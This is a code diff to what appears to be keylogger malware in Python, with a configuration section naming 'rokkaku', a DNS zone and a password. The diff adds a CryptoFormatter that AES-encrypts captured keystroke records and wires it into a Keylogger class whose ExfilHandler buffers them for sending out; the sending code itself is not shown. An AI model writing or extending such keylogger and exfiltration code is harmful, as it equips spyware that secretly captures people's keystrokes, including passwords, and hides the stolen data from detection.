@@ -22,8 +22,8 @@ import time
 
 cfg = """
 [rokkaku]
-dns_zone
-password
+dns_zone = test
+password = test
 """
 
 
@@ -51,12 +51,29 @@ mal_cfg = cfg_factory(cfg)
 
 class CryptoFormatter(logging.Formatter):
 
+    fmt = '%(asctime)s %(message)s'
+    converter = time.gmtime
+    datefmt = '%Y-%m-%d %H:%M:%S'
+
+    def __init__(self, fmt=fmt, datefmt=datefmt):
+        super(CryptoFormatter, self).__init__(fmt, datefmt)
+        self.aes = aes_factory(mal_cfg)
+
     def format(self, record):
-        if record.levelno in (logging.CRITICAL,
-                              logging.ERROR,
-                              logging.INFO,
-                              logging.WARNING):
-            pass
+        levels = (
+            logging.CRITICAL,
+            logging.DEBUG,
+            logging.ERROR,
+            logging.INFO,
+            logging.WARNING)
+        if record.levelno in levels:
+            encrypted = self.aes.encrypt(
+                bytes(
+                    logging.Formatter.format(
+                        self,
+                        record),
+                    'utf8'))
+            return encrypted.decode('utf8')
 
 
 class ExfilHandler(logging.handlers.MemoryHandler):
@@ -89,26 +106,18 @@ class ExfilHandler(logging.handlers.MemoryHandler):
         self.target.stream = StringIO()
 
 
-class UTCFormatter(logging.Formatter):
-    converter = time.gmtime
-
-
 class Keylogger(object):
 
-    BUFFER_SIZE = 100
-    BASE_FORMAT = '%(asctime)s %(message)s'
-    DATE_FORMAT = '%Y-%m-%d %H:%M:%S'
+    b_sz = 100
 
     def __init__(self, logger=None):
         self.logger = logger or logging.getLogger(__name__)
         self.logger.setLevel(logging.INFO)
         stream_handler = logging.StreamHandler(StringIO())
-        formatter = UTCFormatter(
-            fmt=self.BASE_FORMAT,
-            datefmt=self.DATE_FORMAT)
+        formatter = CryptoFormatter()
         stream_handler.setFormatter(formatter)
         self.exfil_handler = ExfilHandler(
-            capacity=self.BUFFER_SIZE, target=stream_handler)
+            capacity=self.b_sz, target=stream_handler)
         self.logger.addHandler(self.exfil_handler)
 
     def log(self, key):
